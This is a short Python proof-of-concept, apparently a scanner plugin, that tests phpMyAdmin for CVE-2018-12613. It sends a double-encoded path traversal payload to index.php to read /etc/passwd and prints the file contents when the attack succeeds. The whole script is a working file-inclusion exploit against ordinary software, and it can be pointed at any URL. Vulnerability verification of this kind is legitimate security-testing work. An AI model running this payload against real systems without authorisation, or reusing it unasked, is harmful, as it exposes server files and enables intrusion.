#!/usr/bin/env python3

'''
name: CVE-2018-12613文件包含漏洞
description: CVE-2018-12613文件包含漏洞
'''

from app.lib.utils.request import request

class CVE_2018_12613_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
            'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0",
        }

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        url  = self.url + "/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd"
        try:
            req =request.get(url, headers = self.headers)
            if req.status_code == 200 and 'phpMyAdmin' in req.headers['Set-Cookie'] and 'root' in req.text:
                print('存在CVE-2018-12613漏洞,结果是:', req.text)
                return True
            else:
                print('不存在CVE-2018-12613漏洞')
                return False
        except Exception as e:
            print (e)
            print('不存在CVE-2018-12613漏洞')
            return False

if __name__ == '__main__':
    CVE_2018_12613 = CVE_2018_12613_BaseVerify('http://127.0.0.1:8080')
    CVE_2018_12613.run()